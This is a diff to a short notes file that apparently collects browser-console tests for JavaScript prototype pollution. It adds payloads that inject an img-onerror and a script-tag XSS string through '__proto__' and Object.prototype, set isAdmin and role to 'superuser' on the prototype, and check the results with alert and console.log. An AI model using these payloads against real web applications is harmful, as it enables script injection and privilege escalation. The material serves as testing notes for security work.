@@ -2,6 +2,26 @@
 
 Use the Browser console to test : Dev tools
 
+1.
+Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
+document.write({}.innerHTML);
+
+2.
+{ "__proto__": { "XSS": "<script>alert('silent')</script>" } }
+
+document.body.innerHTML = "<div>" + {}.XSS + "</div>";
+Object.prototype.isAdmin = true;
+Object.prototype.role = "superuser";
+{ "__proto__": { "XSS": "<script>alert('silent')</script>" } }
+
+
+
+to check : 
+alert(({}).__proto__.XSS);
+alert(Object.prototype.XSS);
+alert({}.XSS);
+console.log({}.XSS);
+
 { "__proto__": { "XSS": "<script>alert('silent')</script>" } }
 console.log({}.XSS);
 document.body.innerHTML = "<div>" + {}.XSS + "</div>";
